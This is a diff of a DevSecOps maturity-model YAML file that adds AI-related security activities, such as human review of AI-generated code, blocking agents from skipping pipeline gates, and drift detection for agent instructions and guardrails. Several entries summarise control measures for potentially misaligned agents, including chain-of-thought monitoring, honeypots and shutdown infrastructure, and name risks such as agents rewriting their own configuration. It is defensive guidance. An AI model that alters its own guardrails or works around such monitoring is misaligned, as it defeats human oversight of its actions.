-      description: "AI-generated code is plausible-looking by construction and often
-        accepted\nwithout scrutiny (\"automation bias\"). It must be treated like
-        code from an\nuntrusted contributor: a human with knowledge of the codebase
-        reviews it\nbefore it is merged. The upstream reviews of specification and
-        plan\n(_Human review of AI generated specifications_, _Human review of AI\ngenerated
-        plans_) reduce what code review must catch, and the\nautomated gates (_Self-verification
-        of AI generated changes_, _Static\nand dynamic analysis of AI generated code_)
-        filter mechanical\nfindings \u2014 but neither replaces this activity: agents
-        deviate from\napproved plans, so the code remains the last artifact gate before\nmerge."
+      description: |-
+        AI-generated code is plausible-looking by construction and often accepted
+        without scrutiny ("automation bias"). It must be treated like code from an
+        untrusted contributor: a human with knowledge of the codebase reviews it
+        before it is merged. The upstream reviews of specification and plan
+        (_Human review of AI generated specifications_, _Human review of AI
+        generated plans_) reduce what code review must catch, and the
+        automated gates (_Self-verification of AI generated changes_, _Static
+        and dynamic analysis of AI generated code_) filter mechanical
+        findings. Neither replaces this activity: agents deviate from
+        approved plans, so the code remains the last artifact gate before
+        merge.
       risk: |-
         AI-generated code containing subtle logic flaws, insecure defaults or
         hallucinated/typo-squatted dependencies is merged unreviewed because it
@@ -3343,11 +3878,13 @@ AI:
         - threat
         - documentation
         url: https://storage.googleapis.com/deepmind-media/DeepMind.com/Blog/securing-the-future-of-ai-agents/gdm-ai-control-roadmap.pdf
-        description: "Roadmap for controlling potentially misaligned AI agents: treats
-          agents\nas untrusted principals and layers system-level defences \u2014
-          TRAIT&R threat\ntaxonomy (based on MITRE ATT&CK), action/chain-of-thought
-          monitoring,\npull-request monitoring, UEBA anomaly detection, honeypots
-          and tiered\nprevention/response up to shutdown infrastructure."
+        description: |-
+          Roadmap for controlling potentially misaligned AI agents. It treats
+          agents as untrusted principals and layers system-level defences: the
+          TRAIT&R threat taxonomy (based on MITRE ATT&CK),
+          action/chain-of-thought monitoring, pull-request monitoring, UEBA
+          anomaly detection, honeypots and tiered prevention/response up to
+          shutdown infrastructure.
       - uuid: 0acdc0ea-dbe2-4bcf-9a6c-34fb1c2989a5
         name: 'AI Coding Agent CLI design: Verify & Iterate'
         tags:
@@ -3386,6 +3923,73 @@ AI:
         - 8.29
         openCRE:
         - https://www.opencre.org/node/standard/DevSecOps%20Maturity%20Model%20%28DSOMM%29/section/Verification/subsection/Human%20review%20of%20AI%20generated%20code
+      comments: ""
+    No verification bypass for AI generated code:
+      uuid: c548df0b-0964-4fad-9f98-28fcd7442011
+      description: |-
+        Automated security testing of source code and running applications (SAST,
+        DAST, SCA) is defined in the _Test and Verification_ dimension and applies
+        to all code regardless of its author. This activity does not duplicate those
+        activities; it ensures AI-generated code cannot reach production on a path
+        that skips them (e.g. agent-pushed commits, auto-merge bots, generated
+        infrastructure code outside the pipeline).
+      risk: |-
+        AI agents and code generation workflows introduce alternative paths to
+        production (direct pushes, auto-merges, generated artifacts) that bypass the
+        established SAST/DAST/SCA gates, so AI-generated vulnerabilities are never
+        scanned.
+      measure: |-
+        Enforce that every AI-generated change goes through the same defined build
+        and security testing pipeline as human-written code. Verify branch
+        protection and pipeline gates cannot be bypassed by agent identities.
+      dependsOn:
+      - f6f7737f-25a9-4317-8de2-09bf59f29b5b # Defined build process
+      - 6c05c837-8c99-46e2-828b-7c903e27dba4 # Static analysis for important server side components
+      - 07796811-37f9-467c-9ff2-48f346e77ff3 # Simple Scan
+      assessment: |
+        - Show the branch protection and pipeline gates and that agent identities cannot bypass them (e.g. no direct-push or auto-merge exceptions).
+        - Show for a sample of recent AI-generated changes that each went through the full security testing pipeline.
+      difficultyOfImplementation:
+        knowledge: 2
+        time: 2
+        resources: 1
+      usefulness: 4
+      level: 3
+      tags:
+      - ai
+      - verification
+      implementation:
+      - uuid: d1d4271b-0f4c-4356-845c-8f91b6c83c33
+        name: 'OWASP AISVS Appendix C: Appendix C AI for Code Generation'
+        tags:
+        - ai
+        - documentation
+        - aisvs
+        url: https://github.com/OWASP/AISVS/blob/main/1.0/en/0x92-Appendix-C_AI_for_Code_Generation.md
+        description: |-
+          OWASP Artificial Intelligence Security Verification Standard,
+          Appendix C: Appendix C AI for Code Generation.
+      - uuid: b4bfead3-5fb6-4dd0-ba44-5da713bd22e4
+        name: CI/CD tools
+        tags:
+        - ci-cd
+        url: https://martinfowler.com/articles/continuousIntegration.html
+        description: CI/CD tools such as jenkins, gitlab-ci or github-actions
+      - uuid: 99211481-de9c-4358-880e-628366416a27
+        name: About protected branches
+        url: https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches
+        tags:
+        - source-code-protection
+        - scm
+      references:
+        samm2:
+        - I-SB-A-1
+        iso27001-2017:
+        - 14.2.2
+        iso27001-2022:
+        - 8.32
+        openCRE:
+        - https://www.opencre.org/node/standard/DevSecOps%20Maturity%20Model%20%28DSOMM%29/section/Verification/subsection/No%20verification%20bypass%20for%20AI%20generated%20code
       comments: ""
     Security test generation with AI:
       uuid: fea96e68-de10-4a62-9df0-4727f700a4a0
@@ -3449,10 +4053,12 @@ AI:
         dependency, e.g. through a compromised publisher account or a
         malicious update. The basis is _Test for compromised components_
         (Test and Verification, Static depth for applications); behavioral
-        classification registries extend it to AI components by assigning
-        stable identifiers and behavioral fingerprints to skill files, MCP
-        servers and agent plugins, so compromised or deviating components can
-        be identified and blocked like compromised packages.
+        classification registries extend it to AI components: they catalog
+        agent extensions (skills, MCP servers, plugins) under persistent
+        identifiers together with a record of how each component actually
+        behaves, so a component whose behavior starts to deviate, or that
+        appears in compromise advisories, can be identified and blocked like
+        a compromised package.
       risk: |-
         An approved AI component (skill, MCP server, plugin, model) is
         compromised after its adoption, e.g. via a hijacked maintainer
@@ -3515,6 +4121,17 @@ AI:
         description: |-
           OWASP Artificial Intelligence Security Verification Standard,
           category C06: Supply Chain Security.
+      - uuid: 9d226705-6a42-4653-aa98-53d7e69e8a4c
+        name: OWASP Top 10 for Agentic Applications
+        tags:
+        - ai
+        - documentation
+        - threat
+        url: https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/
+        description: |-
+          The ten most critical security risks of agentic AI systems (ASI01-ASI10),
+          e.g. agent goal hijack, tool misuse, memory poisoning and rogue agents.
+          Usable as a threat catalog for threat modeling and red teaming of AI agents.
       references:
         samm2:
         - O-EM-A-1
@@ -3527,22 +4144,26 @@ AI:
       comments: ""
     Drift detection for agent instructions and guardrails:
       uuid: 30e29dfc-2bb8-4fe1-bc7e-b3a9ade1ee9e
-      description: "_Protection of agent memory against poisoning_ puts system prompts,\nrule
-        files and guardrail configurations under version control and\nreview \u2014
-        drift detection continuously verifies that what runs in\nproduction still
-        matches the approved state. Deployed instructions\nand guardrails can be changed
-        past the review process: through a\nquick hotfix, direct console access, a
-        compromised pipeline or an\nagent writing to its own configuration. Comparing
-        hashes of the\nnormalized deployed content against the last approved repository\nversion
-        detects such silent changes. The generic detection of\nconfiguration drift
-        in production is defined in _Drift detection for\ndeployed configuration_
-        (Build and Deployment) \u2014 this activity\nextends it to the content assets
-        that determine agent behavior."
-      risk: "A system prompt or guardrail configuration is modified outside the\nreview
-        process \u2014 by an attacker, by an agent altering its own\ninstructions
-        or by a well-meant manual hotfix. The deployed agent\nbehaves differently
-        from the reviewed state, loosened guardrails are\nnever tightened again (\"configuration
-        drift\") and nobody notices,\nbecause the repository still looks correct."
+      description: |-
+        _Protection of agent memory against poisoning_ puts system prompts,
+        rule files and guardrail configurations under version control and
+        review. Drift detection continuously verifies that what runs in
+        production still matches the approved state. Deployed instructions
+        and guardrails can be changed past the review process: through a
+        quick hotfix, direct console access, a compromised pipeline or an
+        agent writing to its own configuration. Comparing hashes of the
+        normalized deployed content against the last approved repository
+        version detects such silent changes. The generic detection of
+        configuration drift in production is defined in _Drift detection for
+        deployed configuration_ (Build and Deployment). This activity
+        extends it to the content assets that determine agent behavior.
+      risk: |-
+        A system prompt or guardrail configuration is modified outside the
+        review process (by an attacker, by an agent altering its own
+        instructions or by a well-meant manual hotfix). The deployed agent
+        behaves differently from the reviewed state, loosened guardrails are
+        never tightened again ("configuration drift") and nobody notices,
+        because the repository still looks correct.
       measure: |-
         Compare the deployed state of agent instructions (system prompts,
         rule files) and guardrail configurations against the last approved
@@ -3578,13 +4199,15 @@ AI:
         - logging
         - documentation
         url: https://labs.cloudsecurityalliance.org/agentic/agentic-identity-governance-framework-v1/
-        description: "Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for
-          identity,\naccess and content governance of autonomous AI agents along six
-          axes:\nidentification (shadow agents), authentication, authorization,\naudit/non-repudiation
-          (structured audit log with mandatory fields for\nthe causal chain, correlation
-          identifiers across multi-agent chains,\ntamper evidence via hash chaining
-          and write-once storage),\nprompt injection prevention and data flow tracking
-          \u2014 mapped to EU AI Act,\nGDPR, ISO 42001/27001 and NIST AI RMF."
+        description: |-
+          Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for identity,
+          access and content governance of autonomous AI agents along six axes:
+          identification (shadow agents), authentication, authorization,
+          audit/non-repudiation (structured audit log with mandatory fields for
+          the causal chain, correlation identifiers across multi-agent chains,
+          tamper evidence via hash chaining and write-once storage),
+          prompt injection prevention and data flow tracking. The framework is
+          mapped to EU AI Act, GDPR, ISO 42001/27001 and NIST AI RMF.
       - uuid: 9d226705-6a42-4653-aa98-53d7e69e8a4c
         name: OWASP Top 10 for Agentic Applications
         tags:
@@ -3602,12 +4225,14 @@ AI:
         - ai
         - documentation
         url: https://owasp.org/www-project-ai-maturity-assessment/
-        description: "Maturity model for AI systems (v1.0, August 2025) in the style
-          of the\nOWASP Software Assurance Maturity Model (SAMM), with eight domains:\nresponsible
-          AI, governance, data management, privacy, design,\nimplementation, verification
-          and operations. Each practice defines\nthree maturity levels with assessment
-          worksheets \u2014 usable to assess\nand plan the organizational maturity
-          around the AI activities of this\ndimension."
+        description: |-
+          Maturity model for AI systems (v1.0, August 2025) in the style of the
+          OWASP Software Assurance Maturity Model (SAMM), with eight domains:
+          responsible AI, governance, data management, privacy, design,
+          implementation, verification and operations. Each practice defines
+          three maturity levels with assessment worksheets, usable to assess
+          and plan the organizational maturity around the AI activities of this
+          dimension.
       references:
         samm2:
         - O-EM-A-2
@@ -3681,7 +4306,7 @@ Build and Deployment:
       comments: ""
       tags:
       - none
-    Building and testing of artifacts in virtual environments:
+    Building and testing of artifacts in virtualized environments:
       uuid: a340f46b-6360-4cb8-847b-a0d3483d09d3
       description: |-
         While building and testing artifacts, third party systems, application frameworks
@@ -3703,6 +4328,8 @@ Build and Deployment:
         resources: 2
       usefulness: 2
       level: 2
+      dependsOn:
+      - 3a94d55e-fd82-4996-9eb3-20d23ff2a873 # Applications are running in virtualized environments
       implementation:
       - uuid: b4bfead3-5fb6-4dd0-ba44-5da713bd22e4
         name: CI/CD tools
@@ -3722,7 +4349,7 @@ Build and Deployment:
         iso27001-2022:
         - 8.31
         openCRE:
-        - https://www.opencre.org/node/standard/DevSecOps%20Maturity%20Model%20%28DSOMM%29/section/Build/subsection/Building%20and%20testing%20of%20artifacts%20in%20virtual%20environments
+        - https://www.opencre.org/node/standard/DevSecOps%20Maturity%20Model%20%28DSOMM%29/section/Build/subsection/Building%20and%20testing%20of%20artifacts%20in%20virtualized%20environments
       comments: ""
       tags:
       - none
@@ -4292,9 +4919,10 @@ Build and Deployment:
         tags:
         - deployment
         url: https://fluxcd.io/
-        description: "GitOps controller for Kubernetes that continuously reconciles
-          the\ncluster state against the versioned desired state in Git \u2014 out-of-band\nchanges
-          are detected as drift and automatically reverted or reported."
+        description: |-
+          GitOps controller for Kubernetes that continuously reconciles the
+          cluster state against the versioned desired state in Git. Out-of-band
+          changes are detected as drift and automatically reverted or reported.
       - uuid: 0d63f907-37fe-4375-88a5-a5e252732618
         name: terraform
         tags:
@@ -5029,7 +5657,7 @@ Culture and Organization:
 
         ![SKF](https://github.com/OWASP/www-project-integration-standards/raw/master/writeups/owasp_in_sdlc/images/skf_qs.png "SKF")
 
-        This practice has the side effect that it trains non-security specialists to think like attackers.
+        This practice has the side effect that it trains non-security specialists to spot how functionality can be misused.
 
         The outcomes of this stage should help lay the foundation of secure design and considerations.
 
@@ -5044,6 +5672,10 @@ Culture and Organization:
         GraphQL queries are dynamically translated to SQL, Elasticsearch and NoSQL queries. Access to data is protected with basic auth set to _1234:1234_ for development purposes.
 
         Source: OWASP Project Integration Project
+        # AI support
+        Large language models can support threat modeling as a complementary tool: given an architecture description, a data flow diagram or a user story, they generate candidate threat lists (e.g. along STRIDE) and suggested mitigations, which the team then reviews, corrects and prioritizes in the workshop. Tools such as [STRIDE GPT](https://github.com/mrwadams/stride-gpt) automate this drafting step; agentic applications such as [Threat Designer](https://github.com/awslabs/threat-designer) analyze architecture diagrams and let the team refine the resulting threat model interactively; agent skills such as [tm_skills](https://github.com/izar/tm_skills) let an AI coding agent generate pytm-based threat models with data flow diagrams directly from the codebase and evaluate user stories for security-notable events.
+
+        Be aware of the failure modes: a language model confidently fills gaps in an incomplete system description and produces threats for components that do not exist, and its output is non-deterministic (the same input yields different threat models). Validating an AI-generated threat model requires exactly the security expertise the tool seems to replace (see [Team Werewolves wins!](https://threatmodeling.dev/team-werewolves-wins/)). AI-generated threats are a starting point for the discussion, not its result. The team exercise and the shared understanding remain the core of this activity.
       risk: Technical related threats are discovered too late in the development and
         deployment process.
       measure: |
@@ -5104,6 +5736,32 @@ Culture and Organization:
         - storage
         - cluster
         - kubernetes
+      - uuid: 38b95d1b-558d-4a04-9b68-34f9d57c4aae
+        name: Threat Designer
+        tags:
+        - ai
+        - threat
+        - tool
+        url: https://github.com/awslabs/threat-designer
+        description: |-
+          Open-source (Apache 2.0), AI-driven threat modeling application by AWS
+          Labs: agents analyze uploaded architecture diagrams, derive STRIDE-based
+          threat lists and attack trees, and support iterative refinement and
+          export of the resulting threat model.
+      - uuid: ec8c0aa5-e308-4d86-88ec-987537b7689a
+        name: tm_skills
+        tags:
+        - ai
+        - threat
+        - tool
+        url: https://github.com/izar/tm_skills
+        description: |-
+          Open-source (MIT) collection of agent skills for continuous threat
+          modeling by Izar Tarandach, maintainer of pytm: the skills let AI
+          coding agents such as Claude Code generate pytm-based threat models
+          with data flow diagrams from a codebase, evaluate user stories for
+          security-notable events and suggest mitigations, and provide rapid
+          security starting points for new systems or features.
       references:
         samm2:
         - D-TA-B-2
@@ -5184,6 +5842,17 @@ Culture and Organization:
       - none
     Creation of simple abuse stories:
       uuid: bacf85b6-5bc0-405d-b5ba-a5d971467cc1
+      description: |-
+        Abuse stories are the attacker's counterpart to user stories: for a
+        given user story they describe how the same functionality can be
+        misused. Large language models are well suited as a complementary
+        tool for this activity: given a user story and its acceptance
+        criteria, they generate candidate abuse stories. This covers a step
+        teams often skip, because systematically asking how functionality
+        can be misused requires experience most development teams do not
+        have. Generated abuse stories are drafts: the team
+        reviews them, discards irrelevant ones and derives security
+        acceptance criteria from the relevant ones.
       risk: User stories mostly don't consider security implications. Security flaws
         are discovered too late in the development and deployment process.
       measure: Abuse stories are created during the creation of user stories.
@@ -5302,6 +5971,8 @@ Culture and Organization:
         * Input is escaped output is encoded appropriately using well established libraries.
 
         Source: OWASP Project Integration Project
+        # AI support
+        At this maturity level, AI can lift threat modeling from periodic workshops to a continuous activity: AI threat modeling tools generate architecture-aware threat model drafts from feature tickets and design documents before implementation starts, re-run the analysis when new tickets arrive and compare the threat model against the implemented code to surface drift between design intent and implementation (e.g. Apiiro AI Threat Modeling, commercial). The generated models require expert review, see the note on failure modes in _Conduction of simple threat modeling on technical level_.
       implementation:
       - uuid: c0533602-11b7-4838-93cc-a40556398163
         name: Whiteboard
@@ -5354,6 +6025,31 @@ Culture and Organization:
         - storage
         - cluster
         - kubernetes
+      - uuid: bb842e92-ab33-4cd9-8b4e-a24faa23eda2
+        name: Apiiro AI Threat Modeling
+        tags:
+        - ai
+        - threat
+        - commercial
+        url: https://apiiro.com/blog/introducing-apiiro-ai-threat-modeling/
+        description: |-
+          Commercial capability that generates architecture-aware threat models
+          from feature tickets and design documents before code exists, re-runs
+          the analysis autonomously when new tickets arrive (e.g. in Jira or
+          GitHub) and compares the threat model against the implemented code to
+          surface drift between design intent and implementation.
+      - uuid: 38b95d1b-558d-4a04-9b68-34f9d57c4aae
+        name: Threat Designer
+        tags:
+        - ai
+        - threat
+        - tool
+        url: https://github.com/awslabs/threat-designer
+        description: |-
+          Open-source (Apache 2.0), AI-driven threat modeling application by AWS
+          Labs: agents analyze uploaded architecture diagrams, derive STRIDE-based
+          threat lists and attack trees, and support iterative refinement and
+          export of the resulting threat model.
       references:
         samm2:
         - D-TA-B-2
@@ -8159,11 +8855,13 @@ Information Gathering:
         - threat
         - documentation
         url: https://storage.googleapis.com/deepmind-media/DeepMind.com/Blog/securing-the-future-of-ai-agents/gdm-ai-control-roadmap.pdf
-        description: "Roadmap for controlling potentially misaligned AI agents: treats
-          agents\nas untrusted principals and layers system-level defences \u2014
-          TRAIT&R threat\ntaxonomy (based on MITRE ATT&CK), action/chain-of-thought
-          monitoring,\npull-request monitoring, UEBA anomaly detection, honeypots
-          and tiered\nprevention/response up to shutdown infrastructure."
+        description: |-
+          Roadmap for controlling potentially misaligned AI agents. It treats
+          agents as untrusted principals and layers system-level defences: the
+          TRAIT&R threat taxonomy (based on MITRE ATT&CK),
+          action/chain-of-thought monitoring, pull-request monitoring, UEBA
+          anomaly detection, honeypots and tiered prevention/response up to
+          shutdown infrastructure.
       - uuid: bbaf5f6a-0366-488b-a712-7f915e866135
         name: Agent Identity Governance Framework (AIGF)
         tags:
@@ -8173,13 +8871,15 @@ Information Gathering:
         - logging
         - documentation
         url: https://labs.cloudsecurityalliance.org/agentic/agentic-identity-governance-framework-v1/
-        description: "Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for
-          identity,\naccess and content governance of autonomous AI agents along six
-          axes:\nidentification (shadow agents), authentication, authorization,\naudit/non-repudiation
-          (structured audit log with mandatory fields for\nthe causal chain, correlation
-          identifiers across multi-agent chains,\ntamper evidence via hash chaining
-          and write-once storage),\nprompt injection prevention and data flow tracking
-          \u2014 mapped to EU AI Act,\nGDPR, ISO 42001/27001 and NIST AI RMF."
+        description: |-
+          Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for identity,
+          access and content governance of autonomous AI agents along six axes:
+          identification (shadow agents), authentication, authorization,
+          audit/non-repudiation (structured audit log with mandatory fields for
+          the causal chain, correlation identifiers across multi-agent chains,
+          tamper evidence via hash chaining and write-once storage),
+          prompt injection prevention and data flow tracking. The framework is
+          mapped to EU AI Act, GDPR, ISO 42001/27001 and NIST AI RMF.
       - uuid: 181e9b98-7d4f-4fff-9181-9f4c4408022e
         name: Anthropic Agent Identity and Access Model
         tags:
@@ -8477,6 +9177,21 @@ Information Gathering:
       - none
     Alerting:
       uuid: 8a442d8e-0eb1-4793-a513-571aef982edd
+      description: |
+        # AI support
+        Two numbers decide whether an alert queue works: how long an anomaly
+        stays unnoticed before a person looks at it, and what share of the
+        incoming alerts gets investigated at all. AI can improve both (see
+        Anthropic's eBook _Zero Trust for AI Agents_): give a triage
+        assistant read-only access to the monitoring data and let it write a
+        structured first assessment for every alert, so analysts start with
+        the alerts that actually need human judgement. Introduce it
+        incrementally: choose a single rule that is known to generate mostly
+        false positives, let the model handle its alert stream for a trial
+        period while a human independently assesses the same alerts, compare
+        the two, and only then move on to the next rule. The assistant
+        prepares evidence, correlation and documentation; decisions about
+        containment and disclosure remain with humans.
       risk: Incidents are discovered after they happened.
       measure: |
         Thresholds for metrics are set. In case the thresholds are reached, alarms are send out. Which should get attention due to the critically.
@@ -8488,7 +9203,22 @@ Information Gathering:
       level: 2
       dependsOn:
       - ded39bcf-4eaa-4c5f-9c94-09acde0a4734 # Visualized metrics
-      implementation: []
+      implementation:
+      - uuid: 7c0749f8-080d-46cf-a8bb-4c2f8a2c25f2
+        name: Zero Trust for AI Agents
+        tags:
+        - ai
+        - documentation
+        url: https://claude.com/blog/zero-trust-for-ai-agents
+        description: |-
+          Free eBook by Anthropic applying Zero Trust principles (never trust,
+          always verify; assume breach; least privilege and least agency) to
+          agentic AI deployments: current threats to agentic systems, three
+          capability tiers for agent identity, access control, observability,
+          behavioral monitoring, input and output controls and recovery, an
+          eight-phase implementation workflow and defensive operations at the
+          speed of autonomous threats. Introduces the design test "does this
+          control make the attack impossible, or just tedious?".
       references:
         samm2:
         - O-IM-A-2
@@ -9307,14 +10037,20 @@ Test and Verification:
   Consolidation:
     Simple false positive treatment:
       uuid: c1acc8af-312e-4503-a817-a26220c993a0
-      description: |
-        Security tests may produce false positives (or _"false alarms"_), findings that are incorrectly identified as vulnerabilities.
-
-        It is important distinguish these from true positive vulnerabilities to avoid wasting time and resources on non-issues.
-
-        False positive treatment ensures that findings from security tests are triaged and documented, allowing teams to distinguish between real vulnerabilities and false positives. This reduces unnecessary work and helps maintain focus on true risks.
-
-        Some positive findings might be considered an _accepted risk_ by the organization. This must also be documented.
+      description: "Security tests may produce false positives (or _\"false alarms\"_),
+        findings that are incorrectly identified as vulnerabilities.\n\nIt is important
+        distinguish these from true positive vulnerabilities to avoid wasting time
+        and resources on non-issues.\n\nFalse positive treatment ensures that findings
+        from security tests are triaged and documented, allowing teams to distinguish
+        between real vulnerabilities and false positives. This reduces unnecessary
+        work and helps maintain focus on true risks.\n\nSome positive findings might
+        be considered an _accepted risk_ by the organization. This must also be documented.\n\nAI
+        can support triage as a complementary tool: a language model with access to
+        the finding and the surrounding code can assess reachability and exploitability
+        in context, propose a triage verdict with reasoning and draft the documentation
+        of the decision. The human decision stays: AI verdicts are input to triage,
+        not a substitute for it \u2014 a wrongly auto-closed true positive is exactly
+        the risk this activity exists to prevent.\n"
       risk: |
         If false positives are not managed, teams may ignore all findings, leading to real vulnerabilities being overlooked and increasing the risk of exploitation. Specially, if tests are automated an run daily.
       measure: |
@@ -10065,6 +10801,14 @@ Test and Verification:
       - none
     Simple Scan:
       uuid: 07796811-37f9-467c-9ff2-48f346e77ff3
+      description: "A simple dynamic scan tests the running application from the outside\nand
+        gives fast feedback on basic weaknesses such as missing security\nheaders
+        or known misconfigurations. In addition to classic dynamic\napplication security
+        testing (DAST) scanners, AI can complement\ndynamic testing: agentic penetration
+        testing tools (e.g. XBOW,\nPentestGPT) explore the running application, chain
+        findings and\nverify exploitability similar to a human tester. As with static\nanalysis,
+        AI-based testing complements deterministic scanners rather\nthan replacing
+        them \u2014 results are non-deterministic and coverage is\nnot guaranteed."
       risk: Deficient security tests are performed. Simple vulnerabilities are not
         detected and missing security configurations (e.g. headers) are not set. Fast
         feedback is not given.
@@ -10091,6 +10835,30 @@ Test and Verification:
       - uuid: 83ae1e92-5eb9-4467-b3d3-fd2f96e6ab63
         name: Arachni
         url: https://github.com/Arachni/arachni
+      - uuid: e4c5a35b-532f-42b3-971a-7132f196fb78
+        name: XBOW
+        tags:
+        - ai
+        - testing
+        - dast
+        - commercial
+        url: https://xbow.com/
+        description: |-
+          Commercial agentic penetration testing platform: AI agents explore a
+          running application autonomously, chain findings into attack paths and
+          validate exploitability before reporting.
+      - uuid: cf897b24-b4d9-418f-a9b0-e110c52cf75e
+        name: PentestGPT
+        tags:
+        - ai
+        - testing
+        - dast
+        url: https://github.com/GreyDGL/PentestGPT
+        description: |-
+          Open-source large language model (LLM) assistant for penetration
+          testing that guides a human tester interactively through an
+          engagement: it keeps track of the test state, suggests next steps and
+          helps interpret tool output.
       references:
         samm2:
         - V-ST-A-1
@@ -11079,6 +11847,14 @@ Test and Verification:
       - none
     Static analysis for important server side components:
       uuid: 6c05c837-8c99-46e2-828b-7c903e27dba4
+      description: "Static application security testing (SAST) analyzes source code
+        for\nvulnerabilities, classically via string matching algorithms and/or\ndataflow
+        analysis. In addition to these rule-based scanners, AI can\nbe used as a complementary
+        analysis tool: AI-assisted code review\nand agentic analysis pipelines (e.g.
+        the Visa Vulnerability Agentic\nHarness) reason about code semantics, perform
+        threat-model-aware\ndeep dives and can verify findings to reduce false positives.\nAI-based
+        analysis complements deterministic scanners rather than\nreplacing them \u2014
+        its results are non-deterministic and coverage is\nnot guaranteed."
       risk: Important parts in the source code of the middleware have vulnerabilities.
       measure: Usage of static analysis tools for important parts of the middleware
         are used. Static analysis uses for example string matching algorithms and/or
@@ -11125,6 +11901,19 @@ Test and Verification:
         tags:
         - ide
         - sast
+      - uuid: 3466f3e2-7185-4e97-8799-314a9267f010
+        name: Visa Vulnerability Agentic Harness (VVAH)
+        tags:
+        - ai
+        - testing
+        - sast
+        url: https://github.com/visa/visa-vulnerability-agentic-harness
+        description: |-
+          Agentic static application security testing (SAST) pipeline that uses
+          frontier AI models for autonomous vulnerability discovery, remediation
+          and validation: threat modeling before analysis, multi-lens deep dives
+          with adversarial verification and multi-agent voting against false
+          positives, followed by proposed and validated fixes.
       dependsOn:
       - f6f7737f-25a9-4317-8de2-09bf59f29b5b # Defined build process
       - 2a44b708-734f-4463-b0cb-86dc46344b2f # Inventory of production components
@@ -11304,6 +12093,19 @@ Test and Verification:
         tags:
         - ide
         - sast
+      - uuid: 3466f3e2-7185-4e97-8799-314a9267f010
+        name: Visa Vulnerability Agentic Harness (VVAH)
+        tags:
+        - ai
+        - testing
+        - sast
+        url: https://github.com/visa/visa-vulnerability-agentic-harness
+        description: |-
+          Agentic static application security testing (SAST) pipeline that uses
+          frontier AI models for autonomous vulnerability discovery, remediation
+          and validation: threat modeling before analysis, multi-lens deep dives
+          with adversarial verification and multi-agent voting against false
+          positives, followed by proposed and validated fixes.
       dependsOn:
       - e237176b-bec5-447d-a926-e37d6dd60e4b # Static analysis for important client side components
       - 6c05c837-8c99-46e2-828b-7c903e27dba4 # Static analysis for important server side components
